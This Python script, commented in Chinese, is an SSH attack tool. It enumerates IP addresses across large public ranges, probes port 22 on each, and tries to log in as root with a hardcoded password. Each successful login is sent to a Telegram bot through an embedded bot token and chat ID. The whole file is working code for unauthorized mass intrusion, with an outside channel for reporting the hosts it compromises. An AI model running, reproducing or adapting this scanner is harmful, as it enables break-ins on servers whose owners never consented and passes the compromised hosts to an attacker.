import os
import paramiko
import socket
import requests

# 生成指定范围内的IP列表
def ip_list_in_range(start_ip, end_ip):
    start_parts = list(map(int, start_ip.split('.')))
    end_parts = list(map(int, end_ip.split('.')))
    
    ips = []
    
    # 循环每一部分的值
    for i in range(start_parts[0], end_parts[0] + 1):
        for j in range(start_parts[1] if i == start_parts[0] else 0, end_parts[1] + 1 if i == end_parts[0] else 256):
            for k in range(start_parts[2] if i == start_parts[0] and j == start_parts[1] else 0, end_parts[2] + 1 if i == end_parts[0] and j == end_parts[1] else 256):
                for l in range(start_parts[3] if i == start_parts[0] and j == start_parts[1] and k == start_parts[2] else 0, end_parts[3] + 1 if i == end_parts[0] and j == end_parts[1] and k == end_parts[2] else 256):
                    ips.append(f"{i}.{j}.{k}.{l}")
    
    return ips

# 检测IP的22端口是否开放
def check_port(ip):
    port = 22
    timeout = 3
    try:
        # 设置超时为3秒，尝试连接到指定IP和端口
        socket.create_connection((ip, port), timeout=timeout)
        return 1
    except (socket.timeout, socket.error):
        return 0

# 使用SSH进行登录尝试
def try_ssh_login(ip):
    username = 'root'
    password = 'NP1215GP55*3*AACAAC'
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(ip, port=22, username=username, password=password, timeout=5)
        return True
    except paramiko.AuthenticationException:
        return False
    except Exception as e:
        return False
    finally:
        ssh.close()

# 发信息给TG机器人
def send_message_to_telegram(message):
    # 机器人令牌和聊天 ID，作为函数内部变量
    bot_token = "8153892091:AAE97Mg3YjSuz_sFUUbVaqzLMSUe6X0YMWk"
    chat_id = "6260718977"
    
    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    params = {
        "chat_id": chat_id,
        "text": message
    }
    response = requests.get(url, params=params)
    
    if response.status_code == 200:
        print("Message sent successfully!")
    else:
        print(f"Failed to send message. Status code: {response.status_code}")
        print(response.json())


def main():
    ip_ranges = [
        ('3.7.1.1', '3.255.255.255'),
        ('18.96.1.0', '18.237.255.255'),
        ('54.150.1.0', '54.255.255.255')
    ]

    for start_ip, end_ip in ip_ranges:
        ip_list_to_check = ip_list_in_range(start_ip, end_ip)
        for ip in ip_list_to_check:
            # 1. 检查22端口是否开放
            if check_port(ip):
                # 2. 如果端口开放，尝试SSH登录
                if try_ssh_login(ip):
                    print(f"成功登录到 {ip}")
                    send_message_to_telegram(ip)
                else:
                    print(f"登录失败: {ip}")
            else:
                print(f"IP {ip} ping null")

if __name__ == "__main__":
    main()
